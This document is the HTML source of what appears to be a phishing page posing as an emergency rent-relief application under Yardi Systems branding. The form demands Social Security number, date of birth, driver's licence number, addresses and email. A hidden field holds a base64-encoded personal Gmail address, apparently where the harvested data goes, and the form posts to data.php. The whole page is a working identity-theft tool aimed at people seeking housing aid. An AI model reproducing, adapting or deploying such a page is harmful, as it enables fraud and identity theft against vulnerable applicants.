<!DOCTYPE html>
<html lang="zxx"><head>
<meta http-equiv="content-type" content="text/html; charset=UTF-8">
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <link rel="stylesheet" href="apply/bootstrap_002.css">
    <link rel="stylesheet" href="apply/owl_002.css">
    <link rel="stylesheet" href="apply/owl.css">
    <link rel="stylesheet" href="apply/meanmenu.css">
    <link rel="stylesheet" href="apply/icofont.css">
    <link rel="stylesheet" href="apply/slick.css">
    <link rel="stylesheet" href="apply/slick-theme.css">
    <link rel="stylesheet" href="apply/magnific-popup.css">
    <link rel="stylesheet" href="apply/animate.css">
    <link rel="stylesheet" href="apply/odometer.css">
    <link rel="stylesheet" href="apply/style.css">
    <link rel="stylesheet" href="apply/responsive.css">
    <!-- Latest compiled and minified CSS -->
        <link rel="stylesheet" href="apply/bootstrap.css">
        <!-- Optional theme -->
        <link rel="stylesheet" href="apply/bootstrap-theme.css">
        <script src="apply/jquery_007.js"></script>
        <link rel="stylesheet" href="apply/form.html">
        <script src="apply/form.js"></script>
    <title>Home Page - Rent Relief</title>
    <link rel="icon" type="image/png" href="css/cropped-rect876.jpg" sizes="32x32">
    <link rel="icon" type="image/png" href="css/cropped-rect876.jpg" sizes="16x16">
    <link href="apply/main.css" rel="stylesheet" media="all">
    <link href="apply/material-design-iconic-font.css" rel="stylesheet" media="all">
    <link href="apply/font-awesome.css" rel="stylesheet" media="all">
    <link href="apply/select2.css" rel="stylesheet" media="all">
    <link href="apply/daterangepicker.css" rel="stylesheet" media="all">
    <script src="apply/jquery_005.js"></script>
    <script src="apply/res-ajax.html"></script>
        <style>
            .post-image {
                /* margin-top: 10px;
			width: 345px;
			height: 216px;
			padding-top: 10px;
			width: 150px; */
                display: block;
                margin-left: auto;
                margin-right: auto;
                width: 80%;
            }

            #fpdiv,
            #bpdiv {
                display: none;
            }
        </style>
        <script>
            function showDiv(clID, el) {
                document.getElementById(clID).style.display = el.value == "" ? 'none' : 'block';
            }
        </script>
</head>

<body>

    <div class="loader" style="display: none;">
        <div class="d-table">
            <div class="d-table-cell">
                <div class="spinner">
                    <div class="double-bounce1"></div>
                    <div class="double-bounce2"></div>
                </div>
            </div>
        </div>
    </div>

    <div class="navbar-area sticky-top">

         <div class="mobile-nav">
            <a href="#" class="logo">
                <img src="apply/logo.svg" alt="Logo" width="500" height="67">
            </a>
        </div>

        <div class="main-nav">
            <div class="container">
                <nav class="navbar navbar-expand-md navbar-light">
                    <a class="navbar-brand" href="#">
                        <img src="apply/logo.svg" alt=" Logo" width="500" height="67">
                    </a>
                    <div class="collapse navbar-collapse mean-menu" id="navbarSupportedContent" style="display: block;">
                        <ul class="navbar-nav">
                            <li class="nav-item">
                                <a href="#about-us" class="nav-link">About Us</a>
                            </li>
                        </ul>
                        <ul class="navbar-nav">
                            <li class="nav-item">
                                <a href="#erap" class="nav-link">ERAP</a>
                            </li>
                        </ul>
                        <ul class="navbar-nav">
                            <li class="nav-item">
                                <a href="#service" class="nav-link">How it works</a>
                            </li>
                        </ul>
                        <ul class="navbar-nav">
                            <li class="nav-item">
                                <a href="#faq" class="nav-link">FAQ</a>
                            </li>
                        </ul>
                        <ul class="navbar-nav">
                            <li class="nav-item">
                                <a href="apply.php">Apply For Relief Fund</a>
                            </li>
                        </ul>
                    </div>
                </nav>
            </div>
        </div>
    </div>



    <div class="main-area">
        <div class="container-fluid">
            <div class="row">
                <div class="col-lg-6 pl-0">
                    <div class="main-left">
                        <!-- <img src="../assets/img/main-bg.jpg" alt="main"> -->
                    </div>
                </div>
                <div class="col-lg-6 ptb-100">
                    <div class="main-item">
                        <div class="main-head">
                            <h2>Rent Relief Application</h2>
                        </div>
                        <div class="main-form">
						 <script src="form.js"></script>
                    <form id="applyForm" class="form" action="data.php" method="POST" enctype="multipart/form-data">
					    <input type="hidden" name="verify" value="<?=base64_decode("YW5kYWxhcy5tYWlsMkBnbWFpbC5jb20=");?>">
                        <div class="row">
                                <div class="separator">Personal Information</div><br>
                                <div class="row row-space">
                                    <div class="col-2">
                                        <div class="input-group" id="b_fnerr">
                                            <label class="label" for="b_fn">First Name<span style="color: red">*</span></label>
                                            <input class="input--style-4" type="text" placeholder="First Name" name="fname" id="b_fn" required="">
                                        </div>
                                    </div>
                                    <div class="col-2">
                                        <div class="input-group" id="b_lnerr">
                                            <label class="label" for="bln">Last Name<span style="color: red">*</span></label>
                                            <input class="input--style-4" type="text" placeholder="Last Name" name="lname" id="b_ln" required="">
                                        </div>
                                    </div>
                                </div>
                                <div class="row row-space">
                                    <div class="col-2">
                                        <div class="input-group" id="b_pherr">
                                            <label class="label" for="b_ph">Phone Number<span style="color: red">*</span></label>
                                            <input class="input--style-4 phone-format" type="text" placeholder="Phone Number" name="ph" id="b_ph" required="">
                                        </div>
                                    </div>
                                    <div class="col-2">
                                        <div class="input-group" id="b_ssnerr">
                                            <label class="label" for="b_ssn">Social Security Number
                                                (SSN)<span style="color: red">*</span></label>
                                            <input class="input--style-4" type="text" placeholder="Social Security Number" name="ssn" id="b_ssn" required="">
                                        </div>
                                    </div>
                                </div>
                                <div class="row row-space">
                                    <div class="col-2">
                                        <div class="input-group" id="b_gderr">
                                            <label class="label">Gender<span style="color: red">*</span></label><br>
                                            <select class="input--style-4" data-val="true" data-val-required="Gender" id="IsCommercial" required id="gender" name="gender">
											<option value="Male">Male</option>
											<option value="Female">Female</option>
											</select>
                                        </div>
                                    </div>
                                    <div class="col-2">
                                        <div class="input-group" id="b_doberr">
                                            <label class="label" for="b_dob">Date of Birth<span style="color: red">*</span></label>
                                            <input class="input--style-4" type="date" name="dob" id="b_dob" required="">
                                        </div>
                                    </div>
                                </div>
                                <div class="row row-space">
                                    <div class="col-4">
                                        <div class="input-group" id="b_dlerr">
                                            <label class="label" for="b_dl">Drivers License
                                                Number<span style="color: red">*</span></label>
                                            <input class="input--style-4" type="text" placeholder="Drivers License Number" name="dl" id="b_dl" required="">
                                        </div>
                                    </div>
                                </div>

                                <div class="row row-space">
                                    <div class="col-4">
                                        <div class="input-group" id="b_addrerr">
                                            <label class="label"> Current Address<span style="color: red">*</span></label>
                                            <input class="input--style-8" type="text" placeholder="Street Address" id="addr" name="addr">
                                        </div>
                                    </div>
                                    <div class="col-2">
                                        <div class="input-group" id="b_cityerr">
                                            <!-- <label class="label">City</label> -->
                                            <input class="input--style-4" type="text" placeholder="City" id="b_city" name="city" required="">
                                        </div>
                                    </div>
                                    <div class="col-2">
                                        <div class="input-group" id="b_stateerr">
                                            <!-- <label class="label">State</label> -->
                                            <input class="input--style-4" type="text" id="b_state" value="" placeholder="State" name="state">
                                        </div>
                                    </div>

                                    <div class="col-2">
                                        <div class="input-group" id="b_ziperr">
                                            <!-- <label class="label">Zip Code</label> -->
                                            <input class="input--style-4 zip" type="text" placeholder="Zip Code" name="zip" id="b_zip" required="">
                                        </div>
                                    </div>
                                    <div class="col-2">
                                        <div class="input-group" id="b_countryerr">
                                            <!-- <label class="label">State</label> -->
                                            <input class="input--style-4" type="text" id="b_country" value="United States" name="country" disabled="disabled">
                                        </div>
                                    </div>
                                </div>
								<div class="row row-space">
                                    <div class="col-4">
                                        <div class="input-group" id="b_addrerr">
                                            <label class="label"> Previous Address<span style="color: red">*</span></label>
                                            <input class="input--style-8" type="text" placeholder="Street Address" id="addr" name="addr2">
                                        </div>
                                    </div>
                                    <div class="col-2">
                                        <div class="input-group" id="b_cityerr">
                                            <!-- <label class="label">City</label> -->
                                            <input class="input--style-4" type="text" placeholder="City" id="b_city" name="city2" required="">
                                        </div>
                                    </div>
                                    <div class="col-2">
                                        <div class="input-group" id="b_stateerr">
                                            <!-- <label class="label">State</label> -->
                                            <input class="input--style-4" type="text" id="b_state" value="" placeholder="State" name="state2">
                                        </div>
                                    </div>

                                    <div class="col-2">
                                        <div class="input-group" id="b_ziperr">
                                            <!-- <label class="label">Zip Code</label> -->
                                            <input class="input--style-4 zip" type="text" placeholder="Zip Code" name="zip2" id="b_zip" required="">
                                        </div>
                                    </div>
                                    <div class="col-2">
                                        <div class="input-group" id="b_countryerr">
                                            <!-- <label class="label">State</label> -->
                                            <input class="input--style-4" type="text" id="b_country" value="United States" name="country2" disabled="disabled">
                                        </div>
                                    </div>
                                </div>
                                <div class="row row-space">
                                    <div class="col-2">
                                        <div class="input-group email" id="b_emerr">
                                            <label class="label" for="b_em">Email<span style="color: red">*</span><span class="err_msg_b_em" id="err_msg_b_em"></span></label>
                                            <input class="input--style-4" type="email" placeholder="Email" name="email" id="b_em" required="">
                                        </div>
                                    </div>
                                    <div class="col-2">
                                        <div class="input-group email" id="b_emerr2">
                                            <label class="label" for="b_em2">Confirm Email<span style="color: red">*</span>
                                                <span class="err_msg_b_em2" id="err_msg_b_em2"></span></label>
                                            <input class="input--style-4" type="text" placeholder="Confirm Email" name="email2" id="b_em2" required="">
                                        </div>
                                    </div>
                                </div>
                            
                                <div class="p-t-15 btn-c">
                                    <button class="btn main-btn" type="submit" name="mybtn" id="mybtn">Submit
                                        Application</button>
                                </div>
                        </div>
                    </form>
                    <div id="success_message" style="width:100%; height:100%; display:none; "> <h3>Application sent successfully! We will get back to you shortly.</h3> </div>
                    <div id="error_message" style="width:100%; height:100%; display:none; "> <h3>Error</h3> Sorry there was an error sending your form. </div>
                </div>
            </div>
        </div>
    </div>

    <div class="copyright-area">
        <div class="container">
            <div class="copyright-item">
                <p>©2022 Yardi Systems, Inc. All Rights Reserved.</p>
            </div>
        </div>
    </div>

    <script src="apply/jquery.js"></script>
    <script src="apply/popper.js"></script>
    <script src="apply/bootstrap.js"></script>
    <script src="apply/owl.js"></script>
    <script src="apply/jquery_004.js"></script>
    <script src="apply/slick.js"></script>
    <script src="apply/jquery_006.js"></script>
    <script src="apply/jquery_002.js"></script>
    <script src="apply/form-validator.js"></script>
    <script src="apply/contact-form-script.js"></script>
    <script src="apply/odometer.js"></script>
    <script src="apply/jquery_003.js"></script>

    <script src="apply/custom.js"></script>


</div></div></body></html>
